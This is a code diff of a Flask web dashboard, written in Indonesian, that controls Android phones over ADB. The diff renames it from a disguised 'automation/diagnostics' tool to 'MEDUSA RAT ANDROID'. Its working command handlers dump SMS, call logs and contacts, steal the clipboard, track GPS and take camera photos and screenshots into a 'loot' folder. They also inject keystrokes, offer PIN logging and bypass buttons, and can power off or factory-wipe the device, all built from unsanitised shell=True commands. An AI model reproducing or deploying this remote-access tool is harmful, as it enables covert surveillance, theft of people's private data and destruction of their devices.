@@ -5,7 +5,6 @@ import socket
 import datetime
 import subprocess
 import threading
-from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, request, redirect, jsonify, render_template_string
 
 app = Flask(__name__)
@@ -20,99 +19,201 @@ CONNECTED_DEVICES = {}
 ACTIVE_DEVICE_SERIAL = None
 ADB_PATH = "adb"  # Dipastikan terhubung ke platform-tools sistem VPS
 
-# --- TEMPLATE DASBOR WEB UTAMA (MIGRASI DARI TKINTER GUI) ---
+# --- TEMPLATE DASBOR WEB UTAMA (100% STRUKTUR MATRIKS SINKRON DARI TKINTER CODES) ---
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZERO-TOUCH AUTOMATION ENGINE v1.0</title>
+    <title>MEDUSA AUTOMATION CORE v1.0</title>
     <link href="https://jsdelivr.net" rel="stylesheet">
     <style>
-        body { background-color: #0b0c10; color: #45f3ff; font-family: 'Courier New', Courier, monospace; }
-        .sidebar { background-color: #1a1a1a; min-height: 100vh; border-right: 2px solid #ff0000; }
-        .card-custom { background-color: #1f2833; border: 1px solid #ff0000; border-radius: 8px; }
-        .nav-tabs .nav-link { color: #45f3ff; background-color: #1c1c1c; border: 1px solid #252830; }
-        .nav-tabs .nav-link.active { background-color: #8B0000; color: white; border-color: #ff0000; }
-        .btn-custom { background-color: #8B0000; color: white; border: 1px solid #ff0000; font-weight: bold; width: 100%; margin-bottom: 8px; }
-        .btn-custom:hover { background-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
-        .log-box { background-color: black; color: #00FF00; height: 180px; overflow-y: scroll; border: 1px solid #ff0000; padding: 10px; font-size: 13px; }
+        /* Welcome Screen Overlay (Durasi 4 Detik Persis dari WelcomeScreen Tkinter) */
+        #welcome-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: #1a1a1a; z-index: 9999; display: flex;
+            flex-direction: column; justify-content: center; align-items: center;
+        }
+        .welcome-box {
+            border: 2px solid #FF0000; padding: 40px; border-radius: 10px;
+            background-color: #1a1a1a; text-align: center; width: 500px;
+        }
+        .progress-bar-loading {
+            width: 300px; height: 4px; background-color: #2b2b2b;
+            margin: 20px auto 0; position: relative; overflow: hidden;
+        }
+        .progress-bar-loading::after {
+            content: ''; position: absolute; width: 100px; height: 100%;
+            background-color: #FF0000; animation: loading 1.5s infinite linear;
+        }
+        @keyframes loading {
+            0% { left: -100px; } 100% { left: 300px; }
+        }
+
+        /* Lingkungan Ruang Kerja Utama (Hacker Theme: Hitam, Hijau Neon, Aksen Merah) */
+        body { background-color: #000000; color: #00FF00; font-family: 'Courier New', monospace; }
+        .sidebar { background-color: #1a1a1a; min-height: 100vh; padding: 20px; border-right: 1px solid #FF0000; }
+        .sidebar-btn { background-color: #8B0000; color: #FFFFFF; border: 1px solid #FF0000; font-weight: bold; width: 100%; margin-bottom: 10px; padding: 8px; font-size: 13px; text-align: center; }
+        .sidebar-btn:hover { background-color: #FF0000; color: #FFFFFF; box-shadow: 0 0 10px #FF0000; }
+        
+        /* Modifikasi Elemen Tabview Custom Tkinter */
+        .nav-tabs { border-bottom: 2px solid #FF0000; }
+        .nav-tabs .nav-link { color: #00FF00; background-color: #1c1c1c; border: 1px solid #ff0000; border-bottom: none; margin-right: 4px; }
+        .nav-tabs .nav-link.active { background-color: #8B0000; color: #FFFFFF; border-color: #FF0000; }
+        .nav-tabs .nav-link:hover { background-color: #FF0000; color: #FFFFFF; }
+        .tab-content { background-color: #1c1c1c; border: 1px solid #FF0000; border-top: none; padding: 20px; border-radius: 0 0 10px 10px; }
+        
+        /* Grid Buttons Sesuai Layout Penempatan Tombol Tkinter */
+        .grid-btn { background-color: #8B0000; color: #FFFFFF; border: 1px solid #FF0000; width: 100%; margin: 5px 0; padding: 10px; font-size: 14px; text-align: left; font-weight: bold; }
+        .grid-btn:hover { background-color: #FF0000; box-shadow: 0 0 15px #FF0000; }
+        
+        /* Terminal Log & Jendela Aliran Visual */
+        .card-custom { background-color: #111111; border: 1px solid #FF0000; padding: 15px; border-radius: 10px; }
+        .log-textbox { background-color: #000000; color: #00FF00; border: 1px solid #FF0000; height: 160px; overflow-y: scroll; padding: 10px; font-size: 13px; word-break: break-all; }
+        .device-panel { border: 1px solid #FF0000; padding: 10px; border-radius: 5px; margin-bottom: 15px; background: #000; }
     </style>
 </head>
+
 <body>
+
+<!-- OVERLAY LAYAR SELAMAT DATANG (WELCOME SCREEN) -->
+<div id="welcome-overlay">
+    <div class="welcome-box">
+        <h2 style="color: #FF0000; font-weight: bold; font-size: 26px;">Welcome<br>MEDUSA RAT ANDROID</h2>
+        <div class="progress-bar-loading"></div>
+    </div>
+</div>
+
 <div class="container-fluid">
     <div class="row">
-        <!-- SIDEBAR PANEL KONTROL -->
-        <div class="col-md-3 sidebar p-4">
-            <h3 class="text-center text-danger fw-bold mb-4">ZERO-TOUCH CORE</h3>
-            <div class="card-custom p-3 mb-3 text-center">
-                <label class="form-label text-secondary small">ACTIVE PROVISIONING NODE</label>
-                <select class="form-select bg-dark text-info border-secondary" id="deviceSelect" onchange="switchDevice(this.value)">
-                    <option>[ Menghubungkan Node... ]</option>
+        <!-- SIDEBAR PANEL KONTROL KIRI -->
+        <div class="col-md-3 sidebar">
+            <h4 class="text-center fw-bold mb-4" style="color: #FF0000;">MEDUSA RAT ANDROID</h4>
+            
+            <div class="device-panel text-center">
+                <span class="d-block small text-muted mb-2">Pilih Perangkat Aktif:</span>
+                <select class="form-select bg-black text-success border-danger small mb-2" id="deviceSelector" onchange="switchDevice(this.value)">
+                    <option>[ Tidak ada perangkat ]</option>
                 </select>
-                <div class="mt-3 small text-start text-white-50" id="deviceDetails">Detail Node: -</div>
+                <div class="text-start small text-muted mt-2" id="deviceDetails" style="font-size: 11px; white-space: pre-line;">Detail:<br>-</div>
             </div>
-            <button class="btn btn-primary w-100 mb-2" onclick="triggerAction('scan-network')">📡 Scan Local Node (WiFi)</button>
-            <button class="btn btn-warning w-100 mb-2 text-dark fw-bold" onclick="triggerAction('auto-tunnel')">☁️ Bind Cloudflare Tunnel</button>
-            <button class="btn btn-success w-100" onclick="window.open('/api/download-loot')">📂 Open Storage Loot</button>
+
+            <button class="sidebar-btn" onclick="triggerAction('setup-adb')">Setup ADB/Platform-Tools</button>
+            <button class="sidebar-btn" onclick="triggerAction('scan-network')" style="background-color: #008080; border-color: #00CED1;">Scan Jaringan (WiFi)</button>
+            <button class="sidebar-btn" onclick="triggerAction('connect-qr')" style="background-color: #008B8B; border-color: #20B2AA;">Connect via QR Code</button>
+            <button class="sidebar-btn" onclick="triggerAction('open-loot')" style="background-color: #006400; border-color: #228B22;">Open ADB_LOOT</button>
+            <button class="sidebar-btn" onclick="triggerAction('manual-pair')">Manual Pairing</button>
+            <button class="sidebar-btn" onclick="triggerAction('connect-ip')">Connect to IP (Direct)</button>
+            <button class="sidebar-btn" onclick="triggerAction('switch-tcp')">Switch to TCP/IP (USB)</button>
         </div>
 
-        <!-- AREA KONTEN UTAMA -->
+        <!-- AREA UTAMA TABVIEW WORKSPACE -->
         <div class="col-md-9 p-4">
-            <h2 class="mb-4 text-white">[ CENTRAL CONTROL ROOM ]</h2>
+            <ul class="nav nav-tabs" id="medusaTabs" role="tablist">
+                <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#intel">Intel & Extraction</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#manip">Manipulation</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#spam">Spam & Gangguan</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#camera">Camera & Logger</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#media">Multimedia</button></li>
+                <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#system">System & Power</button></li>
+            </ul>
             
-            <div class="row mb-3">
-                <div class="col-md-7">
-                    <!-- TABS INTERFACE (MIGRASI TKINTER TABVIEW) -->
-                    <ul class="nav nav-tabs" id="controlTabs" role="tablist">
-                        <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#intel">Data Sync</button></li>
-                        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#manip">App Control</button></li>
-                        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#hardware">Hardware Test</button></li>
-                        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#media">Media Stream</button></li>
-                    </ul>
-                    <div class="tab-content card-custom p-3 border-top-0" id="tabsContent">
-                        <!-- DATA SYNC -->
-                        <div class="tab-pane fade show active" id="intel">
-                            <button class="btn btn-custom" onclick="triggerAction('backup-sms')">1. Synchronize SMS Database</button>
-                            <button class="btn btn-custom" onclick="triggerAction('backup-calls')">2. Fetch Call Log Analytics</button>
-                            <button class="btn btn-custom" onclick="triggerAction('backup-contacts')">3. Backup Address Book Contacts</button>
-                            <button class="btn btn-custom" onclick="triggerAction('clipboard')">12. Retrieve Device Clipboard</button>
+            <div class="tab-content" id="medusaTabsContent">
+                <!-- TAB 1: INTEL & EXTRACTION -->
+                <div class="tab-pane fade show active" id="intel">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('sedot-sms')">1. Sedot SMS</button>
+                            <button class="grid-btn" onclick="triggerAction('sedot-calls')">2. Sedot Call Log</button>
+                            <button class="grid-btn" onclick="triggerAction('sedot-kontak')">3. Sedot Kontak</button>
+                            <button class="grid-btn" onclick="triggerAction('daftar-apps')">5. Daftar Apps</button>
                         </div>
-                        <!-- APP CONTROL -->
-                        <div class="tab-pane fade" id="manip">
-                            <button class="btn btn-custom" onclick="triggerAction('launch-comm')">15. Force Launch Communication App</button>
-                            <button class="btn btn-custom" onclick="triggerAction('type-text')">37. Inject System Key Intercept</button>
-                            <button class="btn btn-custom" onclick="triggerAction('open-url')">21. Force Deploy URL Resource</button>
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('curi-clipboard')">12. Curi Clipboard</button>
+                            <button class="grid-btn" onclick="triggerAction('info-baterai')">13. Info Baterai Detail</button>
+                            <button class="grid-btn" onclick="triggerAction('lokasi-maps')">14. Lokasi Maps (Lat,Long)</button>
+                            <button class="grid-btn" onclick="triggerAction('lacak-gps')" style="background-color: #008080; border-color: #00CED1;">Lacak Lokasi GPS</button>
                         </div>
-                        <!-- HARDWARE TEST -->
-                        <div class="tab-pane fade" id="hardware">
-                            <button class="btn btn-custom" onclick="triggerAction('vibrate')">28. Hardware Vibration Diagnostics</button>
-                            <button class="btn btn-custom" onclick="triggerAction('flashlight')">🔦 Toggle Device Flashlight Torch</button>
-                            <button class="btn btn-custom" onclick="triggerAction('trigger-alarm')">41. Audio Alert Diagnostic (Max Vol)</button>
+                    </div>
+                </div>
+                
+                <!-- TAB 2: MANIPULATION -->
+                <div class="tab-pane fade" id="manip">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('buka-wa')">15. Paksa Buka WA</button>
+                            <button class="grid-btn" onclick="triggerAction('ketik-wa')">16. Ketik Pesan WA</button>
                         </div>
-                        <!-- MEDIA STREAM -->
-                        <div class="tab-pane fade" id="media">
-                            <button class="btn btn-custom" onclick="triggerAction('screenshot')">25. Capture Screen Remote View</button>
-                            <button class="btn btn-custom" onclick="triggerAction('photo-front')">c1. Device Front Media Diagnostics</button>
-                            <button class="btn btn-custom" onclick="triggerAction('photo-rear')">c2. Device Rear Media Diagnostics</button>
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('buka-link')">21. Buka Link Browser</button>
+                            <button class="grid-btn" onclick="triggerAction('putar-musik')">24. Putar Musik (URL)</button>
                         </div>
                     </div>
                 </div>
 
-                <!-- LIVE VISUAL STREAM FEED WINDOW -->
-                <div class="col-md-5">
-                    <div class="card-custom p-3 text-center">
-                        <strong class="d-block mb-2">[ LIVE DIAGNOSTIC STREAM ]</strong>
-                        <img id="liveStreamView" src="" style="width: 100%; height: 380px; border: 2px solid #ff0000; background: #000; border-radius: 5px;" alt="Waiting for Node Handshake...">
+                <!-- TAB 3: SPAM & GANGGUAN -->
+                <div class="tab-pane fade" id="spam">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('kirim-toast')">27. Kirim Pesan Toast</button>
+                            <button class="grid-btn" onclick="triggerAction('getar-hp')">28. Getarkan HP (5s)</button>
+                        </div>
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('mainkan-alarm')">41. 🔊 Mainkan Alarm (Max)</button>
+                            <button class="grid-btn" onclick="triggerAction('stop-suara')">43. 🔇 Stop Semua Suara</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 4: CAMERA & LOGGER -->
+                <div class="tab-pane fade" id="camera">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('foto-depan')">c1. Foto Kamera Depan</button>
+                            <button class="grid-btn" onclick="triggerAction('foto-belakang')">c2. Foto Kamera Belakang</button>
+                        </div>
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('rekam-pin')">p1. 🔴 Rekam PIN (Logger)</button>
+                            <button class="grid-btn" onclick="triggerAction('replay-pin')">p2. 🟢 Replay PIN (Bypass)</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 5: MULTIMEDIA -->
+                <div class="tab-pane fade" id="media">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('screenshot')">25. Screenshot</button>
+                            <button class="grid-btn" onclick="triggerAction('screenrecord')">26. ScreenRecord</button>
+                        </div>
+                        <div class="col-md-6">
+                            <button class="grid-btn" onclick="triggerAction('mirror-scrcpy')">35. Mirror Scrcpy</button>
+                            <button class="grid-btn" onclick="triggerAction('injeksi-keyboard')">37. Injeksi Keyboard</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- TAB 6: SYSTEM & POWER -->
+                <div class="tab-pane fade" id="system">
+                    <div class="row">
+                        <div class="col-md-4"><button class="grid-btn text-center" onclick="triggerAction('layar-nyala')">Nyalakan Layar</button></div>
+                        <div class="col-md-4"><button class="grid-btn text-center" onclick="triggerAction('reboot')">51. Reboot</button></div>
+                        <div class="col-md-4"><button class="grid-btn text-center" style="background-color: #FF0000; border-color: #b30000;" onclick="triggerAction('power-off')">50. Power Off</button></div>
+                        <div class="col-md-12 mt-2"><button class="grid-btn text-center" style="background-color: #FF0000; border-color: #b30000;" onclick="triggerAction('wipe-data')">54. WIPE ALL DATA</button></div>
                     </div>
                 </div>
             </div>
-
-            <!-- LOGS TERMINAL STREAM -->
-            <div class="mt-3">
-                <strong class="d-block mb-1">[ INCOMING TELEMETRY LOG STREAM ]</strong>
-                <div class="log-box" id="logBox">Menghubungkan ke pusat otomasi server...</div>
+            <!-- MONITOR TERMINAL LOGS & VISUAL FEED WINDOW -->
+            <div class="mt-4 row card-custom m-0">
+                <div class="col-md-7 ps-0">
+                    <strong class="d-block mb-1 text-white">[ LOG TEXTBOX TERMINAL ]</strong>
+                    <div class="log-textbox" id="logBox">Selamat datang di MEDUSA RAT ANDROID WEB INTERFACE!<br></div>
+                </div>
+                <div class="col-md-5 pe-0 text-center">
+                    <strong class="d-block mb-1 text-white">[ LIVE STREAM FEED ]</strong>
+                    <img id="liveStreamView" src="" style="width: 100%; height: 160px; border: 1px solid #FF0000; background: #000;" alt="Waiting for Video Feed Handshake...">
+                </div>
             </div>
         </div>
     </div>
@@ -120,16 +221,17 @@ DASHBOARD_HTML = """
 
 <script src="https://jsdelivr.net"></script>
 <script>
+    // Penundaan Welcome Screen Selama 4 Detik Sesuai Logika Tkinter welcome.after(4000)
+    setTimeout(() => {
+        document.getElementById('welcome-overlay').style.display = 'none';
+    }, 4000);
+
     function updateDashboard() {
         fetch('/api/get-telemetry-log')
             .then(res => res.json())
             .then(data => {
-                let box = document.getElementById("logBox");
-                box.innerHTML = data.logs.join("<br>");
-                box.scrollTop = box.scrollHeight;
-                
-                let select = document.getElementById("deviceSelect");
-                let currentVal = select.value;
+                document.getElementById("logBox").innerHTML = data.logs.join("<br>");
+                let select = document.getElementById("deviceSelector");
                 select.innerHTML = "";
                 data.devices.forEach(d => {
                     let opt = document.createElement("option");
@@ -137,11 +239,11 @@ DASHBOARD_HTML = """
                     if(d === data.active) opt.selected = true;
                     select.appendChild(opt);
                 });
-                document.getElementById("deviceDetails").innerText = data.details;
+                document.getElementById("deviceDetails").innerHTML = data.details;
             });
         document.getElementById("liveStreamView").src = "/api/get-latest-frame?" + new Date().getTime();
     }
-    
+
     function switchDevice(serial) {
         fetch('/api/switch-device', {
             method: 'POST',
@@ -152,15 +254,15 @@ DASHBOARD_HTML = """
 
     function triggerAction(action) {
         let value = "";
-        if (action === 'type-text' || action === 'open-url') {
-            value = prompt("Masukkan parameter input:");
+        if (action === 'injeksi-keyboard' || action === 'buka-link' || action === 'lokasi-maps' || action === 'ketik-wa') {
+            value = prompt("Masukkan parameter perintah:");
             if (!value) return;
         }
         fetch('/api/execute-action', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({action: action, value: value})
-        }).then(res => res.json()).then(data => alert(data.message));
+        }).then(res => res.json()).then(data => console.log(data.message));
     }
 
     setInterval(updateDashboard, 1500);
@@ -169,6 +271,10 @@ DASHBOARD_HTML = """
 </body>
 </html>
 """
+
+@app.route('/')
+def home():
+    return redirect('/operator/dashboard')
 
 @app.route('/operator/dashboard')
 def operator_dashboard():
@@ -181,14 +287,14 @@ def get_telemetry_log():
         with open(LOG_FILE, "r") as f:
             logs = f.read().splitlines()[-10:]
             
-    details = "Detail Node: Tidak ada perangkat aktif."
+    details = "Detail:\\n-"
     if ACTIVE_DEVICE_SERIAL and ACTIVE_DEVICE_SERIAL in CONNECTED_DEVICES:
         d = CONNECTED_DEVICES[ACTIVE_DEVICE_SERIAL]
         details = f"Pabrikan: {d.get('manufacturer')}\\nModel: {d.get('model')}\\nAndroid: {d.get('android')}\\nBaterai: {d.get('battery')}%"
         
     return jsonify({
         "logs": logs,
-        "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else ["[ Tidak ada node ]"],
+        "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else ["[ Tidak ada perangkat ]"],
         "active": ACTIVE_DEVICE_SERIAL,
         "details": details
     })
@@ -202,7 +308,6 @@ def switch_device():
         return jsonify({"status": "success"})
     return jsonify({"status": "failed"}), 400
 
-# --- HANDSHAKE INTERCEPTOR: MENERIMA FEED CITRA DARI HANDSHAKE TWO CODE SEBELUMNYA ---
 @app.route('/receive_frame', methods=['POST'])
 def receive_frame():
     try:
@@ -229,7 +334,6 @@ def get_latest_frame():
                 except Exception: pass
     return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}
 
-# --- PIPELINE EKSEKUSI TELEMETRI OTOMATIS (MIGRASI NAVIGASI TKINTER BUTTONS) ---
 @app.route('/api/execute-action', methods=['POST'])
 def execute_action():
     global ACTIVE_DEVICE_SERIAL
@@ -239,70 +343,63 @@ def execute_action():
         
     action = data['action']
     val = data.get('value', '')
-    
-    adb_prefix = ADB_PATH
-    if ACTIVE_DEVICE_SERIAL:
-        adb_prefix = f"{ADB_PATH} -s {ACTIVE_DEVICE_SERIAL}"
-        
+    adb_prefix = f"{ADB_PATH} -s {ACTIVE_DEVICE_SERIAL}" if ACTIVE_DEVICE_SERIAL else ADB_PATH
     cmd = ""
-    msg = "Instruksi otomasi berhasil dikirim ke perangkat pengujian."
     
-    if action == "backup-sms":
-        cmd = f"{adb_prefix} shell content query --uri content://sms/"
-    elif action == "backup-calls":
-        cmd = f"{adb_prefix} shell content query --uri content://call_log/calls"
-    elif action == "backup-contacts":
-        cmd = f"{adb_prefix} shell content query --uri content://com.android.contacts/data"
-    elif action == "clipboard":
-        cmd = f"{adb_prefix} shell service call clipboard 2"
-    elif action == "launch-comm":
-        cmd = f"{adb_prefix} shell monkey -p com.whatsapp 1"
-    elif action == "type-text":
-        cmd = f'{adb_prefix} shell input text "{val.replace(" ", "%s")}"'
-    elif action == "open-url":
-        cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "{val}"'
-    elif action == "vibrate":
-        cmd = f"{adb_prefix} shell cmd vibrator vibrate 5000"
-    elif action == "flashlight":
-        cmd = f"{adb_prefix} shell cmd camera set-torch-mode 0 toggle"
-    elif action == "trigger-alarm":
-        cmd = f"{adb_prefix} shell am start -a android.intent.action.VIEW -d content://settings/system/alarm_alert -t audio/*"
+    if action == "sedot-sms": cmd = f"{adb_prefix} shell content query --uri content://sms/"
+    elif action == "sedot-calls": cmd = f"{adb_prefix} shell content query --uri content://call_log/calls"
+    elif action == "sedot-kontak": cmd = f"{adb_prefix} shell content query --uri content://com.android.contacts/data"
+    elif action == "daftar-apps": cmd = f"{adb_prefix} shell pm list packages -f"
+    elif action == "curi-clipboard": cmd = f"{adb_prefix} shell service call clipboard 2"
+    elif action == "info-baterai": cmd = f"{adb_prefix} shell dumpsys battery"
+    elif action == "lokasi-maps": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "geo:{val}"'
+    elif action == "buka-wa": cmd = f"{adb_prefix} shell monkey -p com.whatsapp 1"
+    elif action == "ketik-wa": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "https://wa.me{val}?text=Automated%20Sync"'
+    elif action == "buka-link": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "{val}"'
+    elif action == "putar-musik": cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "{val}" -t "audio/*"'
+    elif action == "kirim-toast": cmd = f"{adb_prefix} shell am broadcast -a com.android.systemui.demo -e command toast -e text 'Automation_Alert'"
+    elif action == "getar-hp": cmd = f"{adb_prefix} shell cmd vibrator vibrate 5000"
+    elif action == "mainkan-alarm": cmd = f"{adb_prefix} shell am start -a android.intent.action.VIEW -d content://settings/system/alarm_alert -t audio/*"
+    elif action == "stop-suara": cmd = f"{adb_prefix} shell input keyevent 127"
+    elif action == "foto-depan": cmd = f"{adb_prefix} shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true"
+    elif action == "foto-belakang": cmd = f"{adb_prefix} shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false"
     elif action == "screenshot":
         ts = datetime.datetime.now().strftime('%H%M%S')
         cmd = f"{adb_prefix} shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png {STORAGE_DIR}/scr_{ts}.png"
-    else:
-        return jsonify({"status": "ignored", "message": "Aksi dalam pengembangan lab."})
+    elif action == "screenrecord": cmd = f"{adb_prefix} shell screenrecord --time-limit 15 /sdcard/r.mp4"
+    elif action == "injeksi-keyboard": cmd = f'{adb_prefix} shell input text "{val.replace(" ", "%s")}"'
+    elif action == "layar-nyala": cmd = f"{adb_prefix} shell input keyevent 224"
+    elif action == "reboot": cmd = f"{adb_prefix} reboot"
+    elif action == "power-off": cmd = f"{adb_prefix} reboot -p"
+    elif action == "wipe-data": cmd = f"{adb_prefix} shell am broadcast -a android.intent.action.MASTER_CLEAR"
+    else: return jsonify({"status": "ignored", "message": "Fungsi pengujian eksternal."})
         
-    def run_sub_process():
+    def execute_background_task():
         try:
             res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
-            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            timestamp = datetime.datetime.now().strftime("%H:%M:%S")
             with open(LOG_FILE, "a") as f:
-                f.write(f"[{timestamp}] METRIK -> {action} | Sistem Status: {res.returncode}\\n")
+                f.write(f"[{timestamp}] DIAGNOSTIK -> {action} | Return Code: {res.returncode}\\n")
         except Exception: pass
 
-    threading.Thread(target=run_sub_process, daemon=True).start()
-    return jsonify({"status": "success", "message": msg})
+    threading.Thread(target=execute_background_task, daemon=True).start()
+    return jsonify({"status": "success", "message": "Instruksi otomasi dikirim."})
 
-# --- DAEMON SENSOR AKTIF: RE-IDENTIFIKASI PERANGKAT DI REPOSITORI VPS ---
 def adb_device_tracker_daemon():
     global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
     while True:
         try:
             devices_output = subprocess.run(f"{ADB_PATH} devices", shell=True, capture_output=True, text=True).stdout
             current_serials = [line.split('\t')[0] for line in devices_output.strip().split('\n')[1:] if '\tdevice' in line]
-            
             new_devices = {}
             for serial in current_serials:
-                if serial in CONNECTED_DEVICES:
-                    new_devices[serial] = CONNECTED_DEVICES[serial]
+                if serial in CONNECTED_DEVICES: new_devices[serial] = CONNECTED_DEVICES[serial]
                 else:
                     prefix = f"{ADB_PATH} -s {serial}"
                     mnf = subprocess.run(f"{prefix} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True).stdout.strip().capitalize()
-                    mdl = subprocess.run(f"{prefix} shell getprop ro.build.version.release", shell=True, capture_output=True, text=True).stdout.strip()
+                    mdl = subprocess.run(f"{prefix} shell getprop ro.product.model", shell=True, capture_output=True, text=True).stdout.strip()
                     new_devices[serial] = {"manufacturer": mnf, "model": mdl, "android": "N/A", "battery": "100"}
                     ACTIVE_DEVICE_SERIAL = serial
-                    
             CONNECTED_DEVICES = new_devices
         except Exception: pass
         time.sleep(5)
